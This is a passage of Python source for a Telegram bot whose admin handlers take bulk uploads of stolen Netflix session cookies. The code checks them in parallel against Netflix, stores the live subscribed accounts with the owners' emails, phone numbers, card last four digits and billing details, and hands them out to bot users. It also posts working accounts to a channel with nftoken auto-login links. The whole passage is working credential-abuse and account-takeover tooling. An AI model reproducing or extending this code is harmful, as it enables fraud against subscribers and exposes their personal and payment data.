                [InlineKeyboardButton("🚫 Banned Users", callback_data="admin_banned"), InlineKeyboardButton("🔍 Search User", callback_data="admin_user_search")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
            ]
            
            text = f"""⚙️ <b>ADMIN CONTROL PANEL</b>
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>SYSTEM STATUS</b>
┌─────────────────────
│ Status: <b>🟢 ONLINE</b>
│ Database: <b>Turso + SQLite</b>
│ Accounts DB: <b>SQLite</b>
│ Users DB: <b>Turso</b>
│ Total Users: <b>{len(users)}</b>
└─────────────────────
📊 <b>OVERVIEW METRICS</b>
┌─────────────────────
│ 📦 Total Available: <b>{stats.get('total', 0)}</b>
│ 📋 Pending Reports: <b>{len(pending_reps)}</b>
│ 🚫 Banned Users: <b>{len(banned)}</b>
└─────────────────────
🔽 <b>SELECT ADMIN ACTION:</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_panel error: {e}")
    
    async def admin_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin upload button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="admin_panel")]]
            await self.send_or_edit(
                update,
                f"📤 <b>UPLOAD STOCK FILE</b>\n\n"
                "Please send a <b>.txt</b>, <b>.json</b>, or <b>.zip</b> file containing Netflix cookie credentials.\n\n"
                f"⚡ <i>Supports multi-thread checking ({MAX_CHECK_THREADS} threads) & auto-extracting zip files!</i>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            context.user_data["waiting_for_upload"] = True
        except Exception as e:
            logger.error(f"admin_upload error: {e}")
    
    async def handle_file_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle file upload for stock."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await update.message.reply_text("⛔ Not authorized!")
                return
            
            if not context.user_data.get("waiting_for_upload"):
                return
            
            document = update.message.document
            if not document:
                await update.message.reply_text("❌ Please send a valid document file (.txt, .json, .zip).")
                return
            
            file_name = document.file_name
            if not file_name.lower().endswith(('.txt', '.json', '.zip', '.netscape', '.cookies')):
                await update.message.reply_text("❌ Supported formats are .txt, .json, .zip, .netscape, .cookies")
                return
            
            status_msg = await update.message.reply_text(f"⏳ Downloading <b>{html_escape(file_name)}</b>...", parse_mode=ParseMode.HTML)
            
            file = await context.bot.get_file(document.file_id)
            file_bytes = await file.download_as_bytearray()
            
            cookie_pairs = []
            
            if file_name.lower().endswith('.zip'):
                try:
                    with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
                        for zip_info in zf.infolist():
                            if not zip_info.is_dir() and zip_info.filename.lower().endswith(('.txt', '.json', '.netscape', '.cookies')):
                                try:
                                    content_bytes = zf.read(zip_info.filename)
                                    text_content = content_bytes.decode('utf-8', errors='ignore')
                                    pairs = NetflixService.extract_cookie_pairs(text_content)
                                    cookie_pairs.extend(pairs)
                                except Exception:
                                    pass
                except Exception as e:
                    logger.error(f"Zip extract error: {e}")
                    await status_msg.edit_text("❌ Failed to parse ZIP file content.")
                    return
            else:
                text_content = file_bytes.decode('utf-8', errors='ignore')
                cookie_pairs = NetflixService.extract_cookie_pairs(text_content)
            
            if not cookie_pairs:
                await status_msg.edit_text("❌ No valid Netflix cookie pairs found in uploaded file.")
                context.user_data["waiting_for_upload"] = False
                return
            
            total = len(cookie_pairs)
            await status_msg.edit_text(
                f"🔄 Found <b>{total}</b> cookies. Starting multi-threaded check with {MAX_CHECK_THREADS} threads...",
                parse_mode=ParseMode.HTML
            )
            
            valid = 0
            accounts = []
            account_lock = threading.Lock()
            
            def check_item(item):
                nid, sid = item
                cdict = {"NetflixId": nid}
                if sid:
                    cdict["SecureNetflixId"] = sid
                return NetflixService.check_account(cdict)
            
            loop = asyncio.get_running_loop()
            
            with ThreadPoolExecutor(max_workers=MAX_CHECK_THREADS) as executor:
                futures = [loop.run_in_executor(executor, check_item, item) for item in cookie_pairs]
                completed = 0
                for future in asyncio.as_completed(futures):
                    completed += 1
                    result = await future
                    if result.get("valid") and result.get("subscribed"):
                        nid, sid = cookie_pairs[completed - 1]
                        cookie_text = NetflixService.get_cookie_text(nid, sid)
                        with account_lock:
                            accounts.append({
                                "email": safe_str(result.get("email")),
                                "country": safe_str(result.get("country")),
                                "plan": safe_str(result.get("plan_label", "Unknown")),
                                "cookies": cookie_text,
                                "nftoken": safe_str(result.get("nftoken")),
                                "nftoken_expiry": safe_str(result.get("nftoken_expiry")),
                                "source_file": file_name,
                                "account_name": safe_str(result.get("name")),
                                "streams": safe_int(result.get("streams")),
                                "quality": safe_str(result.get("quality")),
                                "price": safe_str(result.get("price")),
                                "billing_date": safe_str(result.get("billing_date")),
                                "member_since": safe_str(result.get("member_since")),
                                "payment_method": safe_str(result.get("payment_method")),
                                "card_last4": safe_str(result.get("card_last4")),
                                "phone": safe_str(result.get("phone")),
                                "extra_member": safe_bool(result.get("extra_member")),
                                "membership_status": safe_str(result.get("membership_status")),
                                "email_verified": safe_bool(result.get("email_verified")),
                                "profiles": safe_str(result.get("profiles")),
                                "user_guid": safe_str(result.get("user_guid")),
                            })
                            valid += 1
                    
                    if completed % 5 == 0 or completed == total:
                        try:
                            await status_msg.edit_text(
                                f"🔄 Progress: <b>{completed}/{total}</b> | ✅ Valid: <b>{valid}</b> | 💾 Found: <b>{len(accounts)}</b>",
                                parse_mode=ParseMode.HTML
                            )
                        except Exception:
                            pass
            
            if accounts:
                saved = self.account_repo.save_batch(accounts)
                self.stats_repo.log_stock(user_id, file_name, total, saved)
                await status_msg.edit_text(
                    f"✅ <b>STOCK UPLOAD COMPLETE!</b>\n\n"
                    f"📁 <b>File:</b> {html_escape(file_name)}\n"
                    f"🔍 <b>Found:</b> {total}\n"
                    f"✅ <b>Valid Subscribed:</b> {valid}\n"
                    f"💾 <b>Saved to DB:</b> {saved}\n"
                    f"📊 <b>Available Now:</b> {self.account_repo.get_total().get('total', 0)}\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            else:
                self.stats_repo.log_stock(user_id, file_name, total, 0)
                await status_msg.edit_text(
                    f"❌ <b>NO VALID ACTIVE ACCOUNTS FOUND!</b>\n\n"
                    f"📁 <b>File:</b> {html_escape(file_name)}\n"
                    f"🔍 <b>Total Checked:</b> {total}\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            
            context.user_data["waiting_for_upload"] = False
        except Exception as e:
            logger.error(f"handle_file_upload error: {e}")
            context.user_data["waiting_for_upload"] = False
    
    async def admin_stock_mgr(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle stock manager."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            data = update.callback_query.data if update.callback_query else ""
            plan_filter = None
            if data.startswith("sm_filter_"):
                plan_filter = data.split("_")[2]
                if plan_filter == "ALL":
                    plan_filter = None
            
            accounts = self.account_repo.get_available()
            stats = self.account_repo.get_total()
            
            if plan_filter:
                accounts = [a for a in accounts if a.plan.upper() == plan_filter.upper()]
            
            text = f"""📦 <b>ACCOUNT STOCK MANAGER</b>
━━━━━━━━━━━━━━━━━━━━━
Total Available: <b>{stats.get('total', 0)}</b>
Filter Plan: <b>{html_escape(plan_filter or 'ALL')}</b>
Showing: <b>{len(accounts)}</b> accounts
━━━━━━━━━━━━━━━━━━━━━
"""
            keyboard = [
                [
                    InlineKeyboardButton("All", callback_data="sm_filter_ALL"),
                    InlineKeyboardButton("👑 Premium", callback_data="sm_filter_PREMIUM"),
                    InlineKeyboardButton("⭐ Standard", callback_data="sm_filter_STANDARD"),
                    InlineKeyboardButton("🎯 Basic", callback_data="sm_filter_BASIC"),
                ]
            ]
            
            if not accounts:
                text += "<i>No accounts found in this category.</i>\n"
            else:
                for acc in accounts[:15]:
                    text += f"▫️ <b>ID #{acc.id}</b> | <code>{html_escape(acc.email)}</code> | {html_escape(acc.plan)}\n"
                    keyboard.append([InlineKeyboardButton(f"🗑️ Delete #{acc.id}", callback_data=f"del_acc_{acc.id}")])
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard.append([InlineKeyboardButton("🚨 Clear All Stock", callback_data="clear_stock_ALL")])
            keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
            
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_stock_mgr error: {e}")
    
    async def delete_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle delete account callback."""
        try:
            query = update.callback_query
            await query.answer()
            user_id = query.from_user.id
            if not is_admin(user_id):
                return
            
            data = query.data
            if data.startswith("del_acc_"):
                acc_id = int(data.split("_")[2])
                self.account_repo.delete(acc_id)
                await query.answer(f"✅ Account #{acc_id} deleted!")
                await self.admin_stock_mgr(update, context)
            elif data.startswith("clear_stock_"):
                cleared = self.account_repo.clear_all(None)
                await query.answer(f"✅ Cleared {cleared} accounts!")
                await self.admin_stock_mgr(update, context)
        except Exception as e:
            logger.error(f"delete_account_callback error: {e}")
    
    async def admin_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin users button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            users = self.user_repo.get_all()
            text = f"👥 <b>BOT USERS ({len(users)})</b>\n\n"
            keyboard = [[InlineKeyboardButton("🔍 Search User", callback_data="admin_user_search")]]
            
            for u in users[:20]:
                status_str = "🚫 BANNED" if u.is_banned else "🟢 Active"
                text += f"▫️ <b>{html_escape(u.first_name)}</b> (@{html_escape(u.username)}) | ID: <code>{u.user_id}</code> | {status_str} | Warns: {u.warnings}/3\n"
                keyboard.append([InlineKeyboardButton(f"👤 Manage {u.user_id}", callback_data=f"manage_user_{u.user_id}")])
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_users error: {e}")
    
    async def manage_user_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle manage user detail."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                return
            
            query = update.callback_query
            target_uid = int(query.data.split("_")[2])
            user = self.user_repo.get(target_uid)
            
            text = f"""👤 <b>USER MANAGEMENT: {html_escape(user.first_name)}</b>
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{target_uid}</code>
Username: @{html_escape(user.username)}
📅 Joined: {html_escape(user.joined_at)}
🚫 Banned: {'YES' if user.is_banned else 'NO'}
⚠️ Warnings: {user.warnings}/3
📦 Accounts Used: {user.accounts_used}/{MAX_ACCOUNTS_PER_USER}
✅ Working Reports: {user.working_reports}
❌ Not Working Reports: {user.notworking_reports}
━━━━━━━━━━━━━━━━━━━━━
"""
            keyboard = []
            if user.is_banned:
                keyboard.append([InlineKeyboardButton("🔓 Unban User", callback_data=f"unban_user_{target_uid}")])
            else:
                keyboard.append([InlineKeyboardButton("🚫 Ban User", callback_data=f"admin_ban_{target_uid}")])
                keyboard.append([InlineKeyboardButton("⚠️ Warn User (+1)", callback_data=f"admin_warn_{target_uid}")])
            
            keyboard.append([InlineKeyboardButton("🔄 Reset Limits", callback_data=f"reset_user_{target_uid}")])
            keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
            
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"manage_user_detail error: {e}")
    
    async def admin_user_search_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user search prompt."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                return
            context.user_data["waiting_for_user_search"] = True
            keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_users")]]
            await self.send_or_edit(
                update,
                "🔍 <b>SEARCH USER</b>\n\n"
                "Please type and send the User ID or @username below:\n"
                "Example: <code>123456789</code> or <code>@john_doe</code>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logger.error(f"admin_user_search_prompt error: {e}")
    
    async def admin_banned(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle banned users list."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            banned = self.user_repo.get_banned()
            keyboard = []
            text = "🚫 <b>BANNED USERS LIST</b>\n\n"
            if not banned:
                text += "<i>No users are currently banned.</i>\n"
            else:
                for uid, uname, fname in banned[:20]:
                    text += f"▫️ <b>{html_escape(fname)}</b> (@{html_escape(uname)}) - ID: <code>{uid}</code>\n"
                    keyboard.append([InlineKeyboardButton(f"🔓 Unban {uid}", callback_data=f"unban_user_{uid}")])
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_banned error: {e}")
    
    async def unban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle unban user callback."""
        try:
            query = update.callback_query
            await query.answer()
            user_id = query.from_user.id
            if not is_admin(user_id):
                return
            
            data = query.data
            parts = data.split("_")
            if len(parts) >= 3:
                target_uid = int(parts[2])
                self.user_repo.unban(target_uid)
                await query.answer(f"✅ User {target_uid} unbanned!")
                await self.admin_banned(update, context)
        except Exception as e:
            logger.error(f"unban_user_callback error: {e}")
    
    async def admin_user_actions_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin user actions."""
        try:
            query = update.callback_query
            await query.answer()
            admin_id = query.from_user.id
            if not is_admin(admin_id):
                return
            
            data = query.data
            parts = data.split("_")
            action = parts[0] + "_" + parts[1]
            target_uid = int(parts[2])
            
            if action == "admin_ban":
                self.user_repo.ban(target_uid, admin_id, "Banned by Admin action")
                await query.answer("🚫 User banned!")
            elif action == "admin_warn":
                w = self.user_repo.add_warning(target_uid, admin_id, "Warning by Admin action")
                await query.answer(f"⚠️ User warned ({w}/3)!")
            elif action == "reset_user":
                self.db.execute_turso('UPDATE users SET accounts_used = 0, last_account_time = NULL WHERE user_id = ?', (target_uid,))
                self.db.commit_turso()
                await query.answer("🔄 User limits reset!")
            
            await self.manage_user_detail(update, context)
        except Exception as e:
            logger.error(f"admin_user_actions_callback error: {e}")
    
    async def admin_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle broadcast button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]
            users = self.user_repo.get_all()
            await self.send_or_edit(
                update,
                f"📢 <b>BROADCAST</b>\n\n"
                "Send a text message or photo to broadcast to all users.\n"
                f"Total Users: <b>{len(users)}</b>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            context.user_data["waiting_for_broadcast"] = True
        except Exception as e:
            logger.error(f"admin_broadcast error: {e}")
    
    async def _handle_broadcast_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE, file_id: str):
        """Handle photo broadcast."""
        try:
            context.user_data["waiting_for_broadcast"] = False
            users = self.user_repo.get_all()
            active_users = [u for u in users if not u.is_banned]
            total_u = len(active_users)
            caption = update.message.caption or ""
            
            status_msg = await update.message.reply_text(f"🚀 Broadcasting photo to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
            success, failed = 0, 0
            
            for u in active_users:
                try:
                    await context.bot.send_photo(u.user_id, photo=file_id, caption=caption, parse_mode=ParseMode.HTML)
                    success += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
            
            await status_msg.edit_text(
                f"✅ <b>PHOTO BROADCAST COMPLETE!</b>\n\n"
                f"👥 Total Users: <b>{total_u}</b>\n"
                f"✅ Delivered: <b>{success}</b>\n"
                f"❌ Failed: <b>{failed}</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"_handle_broadcast_photo error: {e}")
    
    async def admin_reports(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin reports button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            reports = self.report_repo.get_pending()
            keyboard = []
            text = "📋 <b>PENDING USER REPORTS</b>\n\n"
            
            if not reports:
                text += "<i>No pending reports right now.</i>\n"
            else:
                for rep in reports[:10]:
                    text += f"▫️ <b>Report #{rep['id']}</b> | Type: {rep['report_type'].upper()} | User: @{html_escape(rep['username'])} (ID: <code>{rep['user_id']}</code>)\n"
                    keyboard.append([
                        InlineKeyboardButton(f"🔍 View #{rep['id']}", callback_data=f"view_rep_{rep['id']}")
                    ])
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_reports error: {e}")
    
    async def view_report_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle view report detail."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                return
            
            query = update.callback_query
            rep_id = int(query.data.split("_")[2])
            
            cur = self.db.execute_turso('''
                SELECT r.id, r.user_id, r.account_id, r.report_type, 
                       r.screenshot_file_id, r.reported_at, u.username, a.email
                FROM reports r
                LEFT JOIN users u ON r.user_id = u.user_id
                LEFT JOIN accounts a ON r.account_id = a.id
                WHERE r.id = ?
            ''', (rep_id,))
            r = cur.fetchone()
            
            if not r:
                await self.send_or_edit(update, "Report not found!")
                return
            
            text = f"""📋 <b>REPORT #{r[0]} DETAILS</b>

━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> @{html_escape(r[6])} (ID: <code>{r[1]}</code>)
📧 <b>Account Email:</b> <code>{html_escape(r[7])}</code> (Account ID: {r[2]})
🎯 <b>Reported Status:</b> {safe_str(r[3]).upper()}
📅 <b>Timestamp:</b> {html_escape(r[5])}
━━━━━━━━━━━━━━━━━━━━━
"""
            keyboard = [
                [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{r[0]}_{r[2]}")],
                [InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{r[0]}_{r[2]}_{r[1]}"), InlineKeyboardButton("🚫 Ban User", callback_data=f"ban_user_{r[0]}_{r[2]}_{r[1]}")],
                [InlineKeyboardButton("❌ Dismiss Report", callback_data=f"dismiss_report_{r[0]}_{r[2]}")],
                [InlineKeyboardButton("🔙 Back to Reports", callback_data="admin_reports")]
            ]
            
            if r[4]:
                try:
                    await context.bot.send_photo(
                        chat_id=update.effective_chat.id,
                        photo=r[4],
                        caption=text,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.HTML
                    )
                    return
                except Exception:
                    pass
            
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"view_report_detail error: {e}")
    
    async def admin_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin channels button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            cur = self.db.execute_turso('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
            channels = cur.fetchall()
            
            text = f"""⚙️ <b>CHANNEL MANAGEMENT</b>
━━━━━━━━━━━━━━━━━━━━━
📢 <b>Report Channel ID:</b> <code>{REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}</code>
━━━━━━━━━━━━━━━━━━━━━
🛡️ <b>FORCE-SUBSCRIBE CHANNELS:</b>
"""
            keyboard = []
            if not channels:
                text += "<i>No force-sub channels configured.</i>\n"
            else:
                for ch in channels:
                    status = "🟢 Active" if ch[4] else "🔴 Inactive"
                    text += f"▫️ <b>{html_escape(ch[2])}</b> (<code>{html_escape(ch[1])}</code>) | {status}\n"
                    keyboard.append([InlineKeyboardButton(f"❌ Remove {html_escape(ch[2])}", callback_data=f"del_channel_{ch[0]}")])
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard.append([InlineKeyboardButton("➕ Add Required Channel", callback_data="add_channel_prompt")])
            keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_channels error: {e}")
    
    async def add_channel_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle add channel prompt."""
        try:
            context.user_data["waiting_for_channel"] = True
            keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="admin_channels")]]
            await self.send_or_edit(
                update,
                "➕ <b>ADD REQUIRED CHANNEL</b>\n\n"
                "Send channel details in this format:\n"
                "<code>CHANNEL_ID | CHANNEL_NAME | INVITE_LINK</code>\n\n"
                "Example:\n"
                "<code>@MyChannel | My Updates Channel | https://t.me/MyChannel</code>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logger.error(f"add_channel_prompt error: {e}")
    
    async def del_channel_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle delete channel callback."""
        try:
            query = update.callback_query
            await query.answer()
            cid = int(query.data.split("_")[2])
            self.db.execute_turso('DELETE FROM channels WHERE id = ?', (cid,))
            self.db.commit_turso()
            await query.answer("✅ Channel removed!")
            await self.admin_channels(update, context)
        except Exception as e:
            logger.error(f"del_channel_callback error: {e}")
    
    async def admin_stock_logs(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle stock logs button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            logs = self.stats_repo.get_stock_logs()
            text = "📊 <b>STOCK UPLOAD LOGS</b>\n\n"
            if not logs:
                text += "<i>No stock logs recorded yet.</i>\n"
            else:
                for l in logs:
                    text += f"▫️ <b>{html_escape(l['file_name'])}</b>\n   └ Found: {l['total']} | Valid: {l['valid']} | Admin: {l['admin_id']} | {html_escape(l['time'])}\n"
            
            text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_stock_logs error: {e}")
    
    async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle dashboard button."""
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self.send_or_edit(update, "⛔ Not authorized!")
                return
            
            stats = self.account_repo.get_total()
            users = self.user_repo.get_all()
            banned = self.user_repo.get_banned()
            today = self.stats_repo.get_today()
            
            # Get pending reports
            pending = self.report_repo.get_pending()
            
            # Get channel count
            cur = self.db.execute_turso('SELECT COUNT(*) FROM channels WHERE is_active = 1')
            channels = cur.fetchone()[0] or 0
            
            text = f"""📈 <b>SYSTEM DASHBOARD</b>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>STOCK</b>
┌─────────────────────
│ 📦 Available: <b>{stats.get('total', 0)}</b>
"""
            for plan, count in stats.get('plans', {}).items():
                text += f"│ ▫️ {html_escape(plan)}: <b>{count}</b>\n"
            
            text += f"""└─────────────────────
👥 <b>USERS</b>
┌─────────────────────
│ 👤 Total: <b>{len(users)}</b>
│ 🚫 Banned: <b>{len(banned)}</b>
└─────────────────────
📋 <b>REPORTS</b>
┌─────────────────────
│ 📋 Pending: <b>{len(pending)}</b>
└─────────────────────
⚡ <b>TODAY</b>
┌─────────────────────
│ ✅ Valid: <b>{today.get('hits', 0)}</b>
│ 🆓 Free: <b>{today.get('free', 0)}</b>
│ ❌ Bad: <b>{today.get('bad', 0)}</b>
└─────────────────────
🛡️ <b>CHANNELS</b>
┌─────────────────────
│ 📢 Force-Sub: <b>{channels}</b>
│ 📤 Report: <b>{'✅' if REPORT_CHANNEL_ID else '❌'}</b>
└─────────────────────
⚙️ <b>CONFIG</b>
┌─────────────────────
│ Threads: <b>{MAX_CHECK_THREADS}</b>
│ Cooldown: <b>{WORKING_COOLDOWN_MINUTES}min</b>
│ Max/User: <b>{MAX_ACCOUNTS_PER_USER}</b>
└─────────────────────
👨‍💻 <b>Developer:</b> @Senzo268
"""
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
            await self.send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"admin_dashboard error: {e}")
    
    # ============================================================
    # CHANNEL FUNCTIONS
    # ============================================================
    
    async def _send_working_to_channel(self, bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
        """Send working account to channel."""
        if not REPORT_CHANNEL_ID:
            return None
        
        try:
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_assigned(user_id)
            
            if not account:
                cur = self.db.execute_sqlite('SELECT * FROM accounts WHERE id = ?', (account_id,))
                row = cur.fetchone()
                if row:
                    account = Account(
                        id=row[0], email=safe_str(row[1]), country=safe_str(row[2]),
                        plan=safe_str(row[3]), account_name=safe_str(row[15]),
                        streams=safe_int(row[16]), quality=safe_str(row[17]),
                        price=safe_str(row[18]), billing_date=safe_str(row[19]),
                        extra_member=safe_bool(row[24]), profiles=safe_str(row[28]),
                        user_guid=safe_str(row[29]), nftoken=safe_str(row[5]),
                        nftoken_expiry=safe_str(row[6]), phone=safe_str(row[23]),
                        membership_status=safe_str(row[25])
                    )
            
            if not account:
                return None
            
            token = safe_str(account.nftoken)
            nft_expiry = safe_str(account.nftoken_expiry)
            
            text = f"""📱 <b>WORKING ACCOUNT FOUND!</b>

━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{html_escape(account.email)}</code>
👤 <b>Name:</b> {html_escape(account.account_name)}
📱 <b>Phone:</b> {html_escape(account.phone, 'Not provided')}
🌍 <b>Country:</b> {html_escape(account.country)}
📦 <b>Plan:</b> {html_escape(account.plan)}
🛡️ <b>Status:</b> {html_escape(account.membership_status, 'Active')}
📺 <b>Streams:</b> {account.streams}
🎞️ <b>Quality:</b> {html_escape(account.quality, 'HD')}
💰 <b>Price:</b> {html_escape(account.price, 'N/A')}
🗓️ <b>Billing:</b> {html_escape(account.billing_date)}
👥 <b>Extra Member:</b> {'✅ Yes' if account.extra_member else '❌ No'}
🎭 <b>Profiles:</b> {html_escape(account.profiles, 'None')}
🆔 <b>GUID:</b> <code>{html_escape(account.user_guid)}</code>
━━━━━━━━━━━━━━━━━━━━━
"""
            if token and len(token) > 10:
                text += f"⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n"
            
            text += f"""
━━━━━━━━━━━━━━━━━━━━━
✅ <b>Reported by:</b> @{html_escape(user.username)}
🕐 <b>Time:</b> {get_timestamp()} UTC
━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <b>Developer:</b> @Senzo268

⚠️ <b>This account is working!</b>
"""
            
            keyboard = []
            if token and len(token) > 10:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                    InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                    InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                ])
            
            keyboard.append([
                InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}_{account_id}")
            ])
            
            try:
                sent_message = await bot.send_photo(
                    chat_id=REPORT_CHANNEL_ID,
                    photo=screenshot_file_id,
                    caption=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.HTML
                )
                self.db.execute_turso('UPDATE reports SET channel_post_id = ? WHERE id = ?', (sent_message.message_id, report_id))
                self.db.commit_turso()
                return sent_message.message_id
            except Exception as e:
                logger.error(f"Failed to send photo to channel: {e}")
                try:
                    sent_message = await bot.send_message(
                        chat_id=REPORT_CHANNEL_ID,
                        text=text,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode=ParseMode.HTML
                    )
                    self.db.execute_turso('UPDATE reports SET channel_post_id = ? WHERE id = ?', (sent_message.message_id, report_id))
                    self.db.commit_turso()
                    return sent_message.message_id
                except Exception as ex:
                    logger.error(f"Failed to send text to channel: {ex}")
                    return None
        except Exception as e:
            logger.error(f"_send_working_to_channel error: {e}")
            return None
    
